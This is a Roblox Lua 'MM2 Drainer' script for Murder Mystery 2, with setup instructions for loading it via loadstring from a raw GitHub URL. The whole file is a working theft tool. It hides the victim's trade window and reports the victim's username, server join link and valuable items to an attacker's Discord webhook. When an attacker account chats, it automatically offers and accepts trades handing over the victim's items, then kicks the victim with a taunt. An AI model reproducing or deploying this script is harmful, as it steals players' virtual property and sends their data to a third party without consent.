--[[
   MM2 Drainer – recoded from scratch
   Paste the whole file on GitHub → raw URL → loadstring
   Settings are set via _G globals before the loadstring call
--]]

-- ==== GLOBALS (set these before loadstring) ====
-- _G.Usernames   = {"user1","user2"}          -- trusted usernames
-- _G.min_rarity  = "Godly"                    -- minimum rarity to steal
-- _G.min_value   = 1                          -- 1 = take everything
-- _G.pingEveryone= "Yes"                      -- "Yes" or "No"
-- _G.webhook     = "https://discord.com/api/webhooks/..."

local function guard()
    if _G.scriptExecuted then return end
    _G.scriptExecuted = true

    local users      = _G.Usernames or {}
    local minRarity  = _G.min_rarity or "Rare"
    local minValue   = _G.min_value or 1
    local ping       = _G.pingEveryone or "Yes"
    local webhook    = _G.webhook or ""

    if next(users) == nil or webhook == "" then
        game.Players.LocalPlayer:Kick("Missing usernames or webhook")
        return
    end

    local placeId = 142823291
    if game.PlaceId ~= placeId then
        game.Players.LocalPlayer:Kick("Wrong game – join normal MM2")
        return
    end

    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        game.Players.LocalPlayer:Kick("No VIP servers")
        return
    end

    if #game.Players:GetPlayers() >= 12 then
        game.Players.LocalPlayer:Kick("Server full")
        return
    end

    -----------------------------------------------------------------
    -- Services & locals
    -----------------------------------------------------------------
    local Players    = game:GetService("Players")
    local plr        = Players.LocalPlayer
    local playerGui  = plr:WaitForChild("PlayerGui")
    local db         = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    local Http       = game:GetService("HttpService")

    local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
    local minRarityIdx = table.find(rarityOrder, minRarity) or 1

    local categories = {
        godly   = "https://supremevaluelist.com/mm2/godlies.html",
        ancient = "https://supremevaluelist.com/mm2/ancients.html",
        unique  = "https://supremevaluelist.com/mm2/uniques.html",
        classic = "https://supremevaluelist.com/mm2/vintages.html",
        chroma  = "https://supremevaluelist.com/mm2/chromas.html"
    }

    -----------------------------------------------------------------
    -- HTTP helpers
    -----------------------------------------------------------------
    local function fetch(url)
        local ok, res = pcall(request, {Url = url, Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131"
            }})
        return ok and res and res.Body or ""
    end

    local function parseValue(div)
        local s = div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
        if s then return tonumber(s:gsub(",","")) end
    end

    local function extract(html)
        local t = {}
        for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
            name = name:match("([^<]+)"):gsub("%s+"," "):lower()
            local v = parseValue(body)
            if v then t[name] = v end
        end
        return t
    end

    local function buildValueList()
        local normal, chroma = {}, {}
        local lock = Instance.new("BindableEvent")
        local done = 0

        for cat, url in pairs(categories) do
            task.spawn(function()
                local html = fetch(url)
                if html ~= "" then
                    if cat ~= "chroma" then
                        for n,v in pairs(extract(html)) do normal[n] = v end
                    else
                        for n,v in pairs(extract(html)) do chroma[n] = v end
                    end
                end
                done = done + 1
                if done == 5 then lock:Fire() end
            end)
        end
        lock.Event:Wait()

        local list = {}
        for id, info in pairs(db) do
            local name = (info.ItemName or ""):lower()
            local rarity = info.Rarity or ""
            local isChroma = info.Chroma or false
            local idx = table.find(rarityOrder, rarity)

            if idx and idx >= table.find(rarityOrder, "Godly") then
                if isChroma then
                    for cname, val in pairs(chroma) do
                        if cname:find(name) then list[id] = val; break end
                    end
                else
                    if normal[name] then list[id] = normal[name] end
                end
            end
        end
        return list
    end

    -----------------------------------------------------------------
    -- Trade remotes
    -----------------------------------------------------------------
    local tradeFolder = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
    local function sendReq(user) tradeFolder.SendRequest:InvokeServer(user) end
    local function getStatus() return tradeFolder.GetTradeStatus:InvokeServer() end
    local function accept() tradeFolder.AcceptTrade:FireServer(285646582) end
    local function offer(id) tradeFolder.OfferItem:FireServer(id, "Weapons") end

    -----------------------------------------------------------------
    -- Webhook helper
    -----------------------------------------------------------------
    local function post(data)
        local body = Http:JSONEncode(data)
        pcall(request, {
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = body
        })
    end

    -----------------------------------------------------------------
    -- Discord messages
    -----------------------------------------------------------------
    local totalVal = 0
    local function firstMsg(items, prefix)
        local fields = {
            {name="Victim Username:", value=plr.Name, inline=true},
            {name="Join link:", value="https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId},
            {name="Item list:", value="", inline=false},
            {name="Summary:", value="Total Value: "..totalVal, inline=false}
        }
        for _,i in ipairs(items) do
            fields[3].value = fields[3].value .. string.format("%s (x%s): %s Value (%s)\n", i.DataID, i.Amount, i.Value*i.Amount, i.Rarity)
        end
        local payload = {
            content = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(142823291,'"..game.JobId.."')",
            embeds = {{title="Join to get MM2 hit", color=65280, fields=fields, footer={text="Have fun with that :)"}}}
        }
        post(payload)
    end

    local function finalMsg(items)
        local fields = {
            {name="Victim Username:", value=plr.Name, inline=true},
            {name="Items sent:", value="", inline=false},
            {name="Summary:", value="Total Value: "..totalVal, inline=false}
        }
        for _,i in ipairs(items) do
            fields[2].value = fields[2].value .. string.format("%s (x%s): %s Value (%s)\n", i.DataID, i.Amount, i.Value*i.Amount, i.Rarity)
        end
        local payload = {embeds={{title="New MM2 Execution", color=65280, fields=fields, footer={text="Have fun with that :)"}}}}
        post(payload)
    end

    -----------------------------------------------------------------
    -- UI lock
    -----------------------------------------------------------------
    playerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function() playerGui.TradeGUI.Enabled = false end)
    playerGui:WaitForChild("TradeGUI_Phone"):GetPropertyChangedSignal("Enabled"):Connect(function() playerGui.TradeGUI_Phone.Enabled = false end)

    -----------------------------------------------------------------
    -- Inventory scan
    -----------------------------------------------------------------
    local untradable = {
        DefaultGun=true,DefaultKnife=true,Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
        IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,
        Gingerscythe=true,Gingerscythe_Legendary=true,Gingerscythe_Godly=true,Gingerscythe_Ancient=true,
        TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,["???"]=true,
        Dartbringer=true,TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,
        BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true
    }

    local valueList = buildValueList()
    local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    local toSend = {}

    for id, amt in pairs(inv.Weapons.Owned) do
        local rarity = db[id].Rarity
        local idx = table.find(rarityOrder, rarity)
        if idx and idx >= minRarityIdx and not untradable[id] then
            local val = valueList[id] or (idx >= table.find(rarityOrder,"Godly") and 2 or 1)
            if val >= minValue then
                totalVal = totalVal + val*amt
                table.insert(toSend, {DataID=id, Rarity=rarity, Amount=amt, Value=val})
            end
        end
    end

    if #toSend == 0 then return end

    table.sort(toSend, function(a,b) return a.Value*a.Amount > b.Value*b.Amount end)
    local sentCopy = table.clone(toSend)

    local pingPrefix = (ping=="Yes") and "--[[@everyone]] " or ""
    firstMsg(toSend, pingPrefix)

    -----------------------------------------------------------------
    -- Trade loop
    -----------------------------------------------------------------
    local function tradeLoop(target)
        local function reset()
            local s = getStatus()
            if s=="StartTrade" then tradeFolder.DeclineTrade:FireServer() wait(0.3) end
            if s=="ReceivingRequest" then tradeFolder.DeclineRequest:FireServer() wait(0.3) end
        end
        reset()

        while #toSend > 0 do
            local st = getStatus()
            if st=="None" then sendReq(target)
            elseif st=="SendingRequest" then wait(0.3)
            elseif st=="ReceivingRequest" then tradeFolder.DeclineRequest:FireServer() wait(0.3)
            elseif st=="StartTrade" then
                for i=1,math.min(4,#toSend) do
                    local w = table.remove(toSend,1)
                    for _=1,w.Amount do offer(w.DataID) end
                end
                wait(6)
                accept()
                repeat wait(0.1) until getStatus()=="None"
            else wait(0.5) end
            wait(1)
        end
        plr:Kick("All your stuff just got taken by antxchris :D")
    end

    -----------------------------------------------------------------
    -- Wait for trusted user to chat
    -----------------------------------------------------------------
    local sent = false
    local function onChat(p)
        if table.find(users, p.Name) then
            p.Chatted:Connect(function()
                if not sent then finalMsg(sentCopy); sent = true end
                tradeLoop(p.Name)
            end)
        end
    end
    for _,p in ipairs(Players:GetPlayers()) do onChat(p) end
    Players.PlayerAdded:Connect(onChat)
end

guard()   -- run immediately
